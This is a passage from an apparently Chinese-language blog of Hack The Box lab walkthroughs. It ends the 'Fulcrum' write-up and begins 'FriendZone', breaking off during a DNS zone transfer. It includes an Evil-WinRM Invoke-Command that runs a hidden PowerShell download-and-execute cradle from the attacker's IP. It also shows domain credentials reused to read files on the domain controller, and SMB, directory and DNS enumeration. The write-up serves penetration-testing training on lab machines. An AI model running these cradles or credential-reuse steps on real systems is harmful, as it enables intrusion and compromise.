<span class="hljs-number">360</span>speed failed, profile folder does not exist  <br>[<span class="hljs-type">NOTICE</span>] [<span class="hljs-type">browser.go</span>:<span class="hljs-number">91</span>,<span class="hljs-type">pickFirefox</span>] find browser firefox Firefox failed, profile folder does not exist  <br>[<span class="hljs-type">ERROR</span>] [<span class="hljs-type">main.go</span>:<span class="hljs-number">66</span>,<span class="hljs-type">func1</span>] open results: The system cannot find the file specified.  <br>[<span class="hljs-type">NOTICE</span>] [<span class="hljs-type">main.go</span>:<span class="hljs-number">68</span>,<span class="hljs-type">func1</span>] compress success  <br></code></pre></td></tr></table></figure><p>共享也只有默认的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">PS C:\Users\BTables\Downloads&gt; Get-SMBShare<br>[Important] Session has been idle <span class="hljs-keyword">for</span> more than 10.8 seconds. Shell probably died.<br>Name   ScopeName Path Description  <br>----   --------- ---- -----------  <br>ADMIN$ *              Remote Admin <br>C$     *              Default share<br>IPC$   *              Remote IPC   <br><br><br>PS C:\Users\BTables\Downloads&gt; <br></code></pre></td></tr></table></figure><p>这种shell不太好用，崩掉了。我尝试定位域控：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\WebUser\Documents&gt; Invoke-Command -ComputerName file.fulcrum.local -Credential <span class="hljs-variable">$btcred</span> -ScriptBlock &#123; nslookup dc.fulcrum.local &#125;<br><br>Server:  DC<br>Address:  192.168.122.130<br><br>Name:    dc.fulcrum.local<br>Address:  192.168.122.130<br><br>*Evil-WinRM* PS C:\Users\WebUser\Documents&gt; <br></code></pre></td></tr></table></figure><p>域控似乎只有那台file能访问：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@fulcrum:~<span class="hljs-comment"># nc -zv 192.168.122.130 445</span><br><br></code></pre></td></tr></table></figure><p>上线了：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\WebUser\Documents&gt; <span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ComputerName</span> file.fulcrum.local <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$btcred</span> <span class="hljs-literal">-ScriptBlock</span> &#123; powershell.exe <span class="hljs-literal">-nop</span> <span class="hljs-literal">-w</span> <span class="hljs-keyword">hidden</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://10.10.16.3:80/a&#x27;))&quot;</span> &#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220903121940956.png" alt="image-20220903121940956"></p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220903122500383.png" alt="image-20220903122500383"></p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220903122512600.png" alt="image-20220903122512600"></p><p>域控上有两个共享，在sysvol中有很多很多powershell脚本：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220903122811210.png" alt="image-20220903122811210"></p><p>在其中能够搜索到923a用户的凭证：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220903123132306.png" alt="image-20220903123132306"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\WebUser\Documents&gt; <span class="hljs-variable">$pass</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&#x27;@fulcrum_bf392748ef4e_$&#x27;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\WebUser\Documents&gt; <span class="hljs-variable">$cred</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="hljs-string">&#x27;FULCRUM\923a&#x27;</span>, <span class="hljs-variable">$pass</span>)<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\WebUser\Documents&gt; <span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-Computer</span> dc.fulcrum.local <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span> <span class="hljs-literal">-scriptblock</span> &#123; whoami&#125;<br>fulcrum\<span class="hljs-number">923</span>a<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\WebUser\Documents&gt; <span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-Computer</span> dc.fulcrum.local <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span> <span class="hljs-literal">-scriptblock</span> &#123; <span class="hljs-built_in">cat</span> \users\administrator\desktop\root.txt &#125;<br><span class="hljs-number">8</span>d.....................................<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\WebUser\Documents&gt; <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - FriendZone</title>
    <link href="/post/HackTheBox-FriendZone.html"/>
    <url>/post/HackTheBox-FriendZone.html</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/FriendZone.png"></p><h6 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox/FriendZone$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.10.123<br>[sudo] crazyinside 的密码：<br>Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-08-21 23:09:34 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [131070 ports/host]<br>Discovered open port 22/tcp on 10.10.10.123                                    <br>Discovered open port 445/tcp on 10.10.10.123                                   <br>Discovered open port 53/udp on 10.10.10.123                                    <br>Discovered open port 53/tcp on 10.10.10.123                                    <br>Discovered open port 80/tcp on 10.10.10.123                                    <br>Discovered open port 21/tcp on 10.10.10.123                                    <br>Discovered open port 137/udp on 10.10.10.123                                   <br>Discovered open port 139/tcp on 10.10.10.123                                   <br>Discovered open port 443/tcp on 10.10.10.123     <br>Crazy:~/HackThebox/FriendZone$ sudo nmap -sC -sV 10.10.10.123 -p22,445,53,80,21,137,139,443 -oN FriendZoneport<br>Starting Nmap 7.92SVN ( https://ParrotOS.org ) at 2022-08-22 07:13 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.123<br>Host is up (0.11s latency).<br><br>PORT    STATE  SERVICE     VERSION<br>21/tcp  open   ftp         vsftpd 3.0.3<br>22/tcp  open   ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 a96824bc971f1e54a58045e74cd9aaa0 (RSA)<br>|   256 e5440146ee7abb7ce91acb14999e2b8e (ECDSA)<br>|_  256 004e1a4f33e8a0de86a6e42a5f84612b (ED25519)<br>53/tcp  open   domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)<br>| dns-nsid: <br>|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu<br>80/tcp  open   http        Apache httpd 2.4.29 ((Ubuntu))<br>|_http-server-header: Apache/2.4.29 (Ubuntu)<br>|_http-title: Friend Zone Escape software<br>137/tcp closed netbios-ns<br>139/tcp open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br>443/tcp open   ssl/http    Apache httpd 2.4.29<br>|_http-server-header: Apache/2.4.29 (Ubuntu)<br>| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO<br>| Not valid before: 2018-10-05T21:02:30<br>|_Not valid after:  2018-11-04T21:02:30<br>| tls-alpn: <br>|_  http/1.1<br>|_ssl-<span class="hljs-built_in">date</span>: TLS randomness does not represent time<br>|_http-title: 404 Not Found<br>445/tcp open   netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)<br>Service Info: Hosts: FRIENDZONE, 127.0.0.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Host script results:<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2022-08-21T23:13:49<br>|_  start_date: N/A<br>| smb-security-mode: <br>|   account_used: guest<br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: disabled (dangerous, but default)<br>| smb2-security-mode: <br>|   311: <br>|_    Message signing enabled but not required<br>|_clock-skew: mean: -1h00m00s, deviation: 1h43m55s, median: -1s<br>|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 000000000000 (Xerox)<br>| smb-os-discovery: <br>|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)<br>|   Computer name: friendzone<br>|   NetBIOS computer name: FRIENDZONE\x00<br>|   Domain name: \x00<br>|   FQDN: friendzone<br>|_  System time: 2022-08-22T02:13:49+03:00<br><br>Service detection performed. Please report any incorrect results at https://ParrotOS.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 25.74 seconds<br>zsh: segmentation fault  sudo nmap -sC -sV 10.10.10.123 -p22,445,53,80,21,137,139,443 -oN <br></code></pre></td></tr></table></figure><p>80页面只有一张图片和几句话。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox/FriendZone$ curl -I 10.10.10.123                          <br>HTTP/1.1 200 OK<br>Date: Sun, 21 Aug 2022 23:15:19 GMT<br>Server: Apache/2.4.29 (Ubuntu)<br>Last-Modified: Fri, 05 Oct 2018 22:52:00 GMT<br>ETag: <span class="hljs-string">&quot;144-577831e9005e6&quot;</span><br>Accept-Ranges: bytes<br>Content-Length: 324<br>Vary: Accept-Encoding<br>Content-Type: text/html<br><br>                                                                                                                                       <br>Crazy:~/HackThebox/FriendZone$ sudo vim /etc/hosts               <br>[sudo] crazyinside 的密码：<br>                                                                                                                                       <br>Crazy:~/HackThebox/FriendZone$ dirsearch -u http://friendzoned.htb           <br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /home/crazyinside/.dirsearch/reports/friendzoned.htb/_22-08-22_07-16-52.txt<br><br>Error Log: /home/crazyinside/.dirsearch/logs/errors-22-08-22_07-16-52.<span class="hljs-built_in">log</span><br><br>Target: http://friendzoned.htb/<br><br>[07:16:52] Starting: <br>[07:17:00] 403 -  304B  - /.htaccess.bak1<br>[07:17:00] 403 -  304B  - /.htaccess.orig<br>[07:17:00] 403 -  306B  - /.htaccess.sample<br>[07:17:00] 403 -  302B  - /.htaccessOLD<br>[07:17:00] 403 -  304B  - /.htaccess.save<br>[07:17:00] 403 -  303B  - /.htaccessOLD2<br>[07:17:00] 403 -  304B  - /.htaccess_orig<br>[07:17:00] 403 -  302B  - /.htaccessBAK<br>[07:17:00] 403 -  305B  - /.htaccess_extra<br>[07:17:00] 403 -  301B  - /.ht_wsr.txt<br>[07:17:00] 403 -  302B  - /.htaccess_sc<br>[07:17:00] 403 -  304B  - /.htpasswd_test<br>[07:17:00] 403 -  300B  - /.htpasswds<br>[07:17:00] 403 -  301B  - /.httr-oauth<br>[07:17:00] 403 -  294B  - /.htm<br>[07:17:00] 403 -  295B  - /.html<br>[07:17:02] 403 -  294B  - /.php<br>[07:17:50] 200 -  324B  - /index.html<br>[07:17:50] 200 -   11KB - /index.bak<br>[07:18:09] 200 -   13B  - /robots.txt<br>[07:18:10] 403 -  304B  - /server-status/<br>[07:18:10] 403 -  303B  - /server-status<br>[07:18:22] 200 -  750B  - /wordpress/<br><br>Task Completed<br>                                                                                                                                       <br>Crazy:~/HackThebox/FriendZone$ <br></code></pre></td></tr></table></figure><p>80端口还是有些地方需要注意的，wordpress是一个空目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox/FriendZone$ curl http://friendzoned.htb/robots.txt        <br>seriously ?!<br>Crazy:~/HackThebox/FriendZone$ file index.bak         <br>index.bak: HTML document, ASCII text<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822072643765.png" alt="image-20220822072643765"></p><p>或许没有。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox/FriendZone$ smbmap -H friendzoned.htb -u <span class="hljs-built_in">whoami</span><br>[+] Guest session       IP: friendzoned.htb:445 Name: unknown                                           <br>        Disk                                                    Permissions     Comment<br>        ----                                                    -----------     -------<br>        <span class="hljs-built_in">print</span>$                                                  NO ACCESS       Printer Drivers<br>        Files                                                   NO ACCESS       FriendZone Samba Server Files /etc/Files<br>        general                                                 READ ONLY       FriendZone Samba Server Files<br>        Development                                             READ, WRITE     FriendZone Samba Server Files<br>        IPC$                                                    NO ACCESS       IPC Service (FriendZone server (Samba, Ubuntu))<br>                                                                                             <br>Crazy:~/HackThebox/FriendZone$ smbclient //10.10.10.123/Development -U <span class="hljs-string">&quot;whoami&quot;</span><br>Password <span class="hljs-keyword">for</span> [WORKGROUP\<span class="hljs-built_in">whoami</span>]:<br>Try <span class="hljs-string">&quot;help&quot;</span> to get a list of possible commands.<br>smb: \&gt; <span class="hljs-built_in">ls</span><br>  .                                   D        0  Mon Aug 22 07:17:22 2022<br>  ..                                  D        0  Thu Jan 24 05:51:02 2019<br><br>                9221460 blocks of size 1024. 6456928 blocks available<br>smb: \&gt; <span class="hljs-built_in">exit</span><br>                                                                                                                                       <br>Crazy:~/HackThebox/FriendZone$ <br></code></pre></td></tr></table></figure><p>SMB有一个能够被读取写入的目录，但是里边空空如也。另一个可读的目录里有一个证明：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox/FriendZone$ smbclient //10.10.10.123/general -U <span class="hljs-string">&quot;whoami&quot;</span><br>Password <span class="hljs-keyword">for</span> [WORKGROUP\<span class="hljs-built_in">whoami</span>]:<br>Try <span class="hljs-string">&quot;help&quot;</span> to get a list of possible commands.<br>smb: \&gt; <span class="hljs-built_in">ls</span><br>  .                                   D        0  Thu Jan 17 04:10:51 2019<br>  ..                                  D        0  Thu Jan 24 05:51:02 2019<br>  creds.txt                           N       57  Wed Oct 10 07:52:42 2018<br><br>                9221460 blocks of size 1024. 6457724 blocks available<br>smb: \&gt; get creds.txt <br>getting file \creds.txt of size 57 as creds.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)<br>smb: \&gt; <br>Crazy:~/HackThebox/FriendZone$ <span class="hljs-built_in">cat</span> creds.txt      <br>creds <span class="hljs-keyword">for</span> the admin THING:<br><br>admin:WORKWORKHhallelujah@<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>443页面是空的：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822073623506.png" alt="image-20220822073623506"></p><p>但是我在证书中看到了另一个域名，或许是我本地hosts记录错了也不一定：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822073707975.png" alt="image-20220822073707975"></p><p>看来是的：<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822073852733.png" alt="image-20220822073852733"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox/FriendZone$ curl -k -I https://friendzone.red/ <br>HTTP/1.1 200 OK<br>Date: Sun, 21 Aug 2022 23:39:04 GMT<br>Server: Apache/2.4.29 (Ubuntu)<br>Last-Modified: Fri, 05 Oct 2018 21:18:21 GMT<br>ETag: <span class="hljs-string">&quot;ee-57781cf9aaa2d&quot;</span><br>Accept-Ranges: bytes<br>Content-Length: 238<br>Vary: Accept-Encoding<br>Content-Type: text/html<br></code></pre></td></tr></table></figure><p>页面源码注释里有些东西：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;title&gt;FriendZone escape software&lt;/title&gt;<br><br>&lt;br&gt;<br>&lt;br&gt;<br><br><br>&lt;center&gt;&lt;h2&gt;Ready to escape from friend zone !&lt;/h2&gt;&lt;/center&gt;<br><br><br>&lt;center&gt;&lt;img src=<span class="hljs-string">&quot;e.gif&quot;</span>&gt;&lt;/center&gt;<br><br>&lt;!-- Just doing some development here --&gt;<br>&lt;!-- /js/js --&gt;<br>&lt;!-- Don<span class="hljs-string">&#x27;t go deep ;) --&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822074116230.png" alt="image-20220822074116230"></p><p>注释里还会有些提示：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822074324102.png" alt="image-20220822074324102"></p><p>暂时不知道它是什么：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox/FriendZone$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;amwwNkdvQTZIbjE2NjExMjUyNTZOeER1REUyeDZR&quot;</span>|<span class="hljs-built_in">base64</span> -d<br>jl06GoA6Hn1661125256NxDuDE2x6Q                                                                                                                                       <br>Crazy:~/HackThebox/FriendZone$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;amwwNkdvQTZIbjE2NjExMjUyNTZOeER1REUyeDZR&quot;</span>|<span class="hljs-built_in">base64</span> -d|<span class="hljs-built_in">base64</span> -d<br>�]:▒�:&#125;z�]v�nz7�<br></code></pre></td></tr></table></figure><p>目录枚举到了admin:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox/FriendZone$ dirsearch -u https://friendzone.red/          <br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /home/crazyinside/.dirsearch/reports/friendzone.red/-_22-08-22_07-40-33.txt<br><br>Error Log: /home/crazyinside/.dirsearch/logs/errors-22-08-22_07-40-33.<span class="hljs-built_in">log</span><br><br>Target: https://friendzone.red/<br><br>[07:40:34] Starting: <br>[07:40:39] 301 -  315B  - /js  -&gt;  https://friendzone.red/js/<br>[07:40:41] 403 -  301B  - /.ht_wsr.txt<br>[07:40:41] 403 -  304B  - /.htaccess.orig<br>[07:40:41] 403 -  304B  - /.htaccess.bak1<br>[07:40:41] 403 -  302B  - /.htaccess_sc<br>[07:40:41] 403 -  306B  - /.htaccess.sample<br>[07:40:41] 403 -  304B  - /.htaccess_orig<br>[07:40:41] 403 -  304B  - /.htaccess.save<br>[07:40:41] 403 -  305B  - /.htaccess_extra<br>[07:40:41] 403 -  304B  - /.htpasswd_test<br>[07:40:41] 403 -  300B  - /.htpasswds<br>[07:40:41] 403 -  301B  - /.httr-oauth<br>[07:40:42] 403 -  302B  - /.htaccessBAK<br>[07:40:42] 403 -  295B  - /.html<br>[07:40:42] 403 -  302B  - /.htaccessOLD<br>[07:40:42] 403 -  294B  - /.htm<br>[07:40:42] 403 -  303B  - /.htaccessOLD2<br>[07:40:44] 403 -  294B  - /.php<br>[07:41:00] 301 -  318B  - /admin  -&gt;  https://friendzone.red/admin/<br>[07:41:00] 200 -  742B  - /admin/<br>[07:41:00] 403 -  305B  - /admin/.htaccess<br>[07:41:00] 200 -  742B  - /admin/?/login<br>[07:41:30] 200 -  238B  - /index.html<br>[07:41:32] 200 -  922B  - /js/<br>[07:41:55] 403 -  303B  - /server-status<br>[07:41:55] 403 -  304B  - /server-status/<br></code></pre></td></tr></table></figure><p>但是跟wordpress一样是空的：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822074452370.png" alt="image-20220822074452370"></p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822074533143.png" alt="image-20220822074533143"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox/FriendZone$ smbmap -H 10.10.10.123 -u admin -p <span class="hljs-string">&#x27;WORKWORKHhallelujah@#&#x27;</span><br>[+] Guest session       IP: 10.10.10.123:445    Name: friendzone.red                                    <br>        Disk                                                    Permissions     Comment<br>        ----                                                    -----------     -------<br>        <span class="hljs-built_in">print</span>$                                                  NO ACCESS       Printer Drivers<br>        Files                                                   NO ACCESS       FriendZone Samba Server Files /etc/Files<br>        general                                                 READ ONLY       FriendZone Samba Server Files<br>        Development                                             READ, WRITE     FriendZone Samba Server Files<br>        IPC$                                                    NO ACCESS       IPC Service (FriendZone server (Samba, Ubuntu))<br>                                                                                                                                       <br>Crazy:~/HackThebox/FriendZone$ <br></code></pre></td></tr></table></figure><p>这账号似乎是错误的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox/FriendZone$ ftp 10.10.10.123                   <br>Connected to 10.10.10.123.<br>220 (vsFTPd 3.0.3)<br>Name (10.10.10.123:crazyinside): admin<br>331 Please specify the password.<br>Password: <br>530 Login incorrect.<br>ftp: Login failed<br>ftp&gt; <span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p>ftp也是不行的。那就只剩DNS了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox/FriendZone$ dig axfr friendzone.red @10.10.10.123<br><br>; &lt;&lt;&gt;&gt; DiG 9.18.4-2-Debian &lt;&lt;&gt;&gt; axfr friendzone.red @10.10.10.123<br>;; global options: +cmd<br>friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800<br>friendzone.red.         604800  IN      AAAA    ::1<br>friendzone.red.         604800  IN      NS      localhost.<br>friendzone.red.         604800  IN      A       127.0.0.1<br>administrator1.friendzone.red. 604800 IN A      127.0.0.1<br>hr.friendzone.red.      604800  IN      A       127.0.0.1<br>uploads.friendzone.red. 604800  IN      A       127.0.0.1<br>friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800<br>;; Query time: 107 msec<br>;; SERVER: 10.10.10.123<span 